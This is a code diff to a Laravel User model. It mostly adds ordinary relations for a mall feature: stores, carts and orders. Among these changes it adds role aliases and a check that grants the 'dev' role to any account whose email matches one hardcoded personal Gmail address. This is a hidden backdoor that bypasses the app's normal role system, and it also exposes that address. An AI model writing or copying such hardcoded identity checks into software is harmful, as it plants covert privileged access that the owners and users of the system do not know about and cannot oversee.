@@ -87,6 +87,26 @@ class User extends Authenticatable
         return $this->hasMany(Order::class);
     }
 
+    public function mallStore(): HasOne
+    {
+        return $this->hasOne(MallStore::class, 'owner_user_id');
+    }
+
+    public function mallCarts(): HasMany
+    {
+        return $this->hasMany(MallCart::class);
+    }
+
+    public function mallOrders(): HasMany
+    {
+        return $this->hasMany(MallOrder::class);
+    }
+
+    public function isMallVendor(): bool
+    {
+        return $this->mallStore()->exists();
+    }
+
     public function transportRequests(): HasMany
     {
         return $this->hasMany(TransportRequest::class);
@@ -134,6 +154,9 @@ class User extends Authenticatable
             'editor' => 'content_manager',
             'staff' => 'sales_staff',
             'member' => 'registered_user',
+            'dev' => 'developer',
+            'developer' => 'dev',
+            'dev_owner' => 'dev',
         ];
 
         $requested = collect($roles)
@@ -142,6 +165,10 @@ class User extends Authenticatable
             ->unique()
             ->values();
 
+        if ($requested->contains('dev') && $this->isDevOwner()) {
+            return true;
+        }
+
         if ($requested->contains($this->role)) {
             return true;
         }
@@ -149,5 +176,10 @@ class User extends Authenticatable
         return $this->roles()
             ->whereIn('slug', $requested->all())
             ->exists();
+    }
+
+    public function isDevOwner(): bool
+    {
+        return strtolower((string) $this->email) === 'jameskoen78@gmail.com';
     }
 }
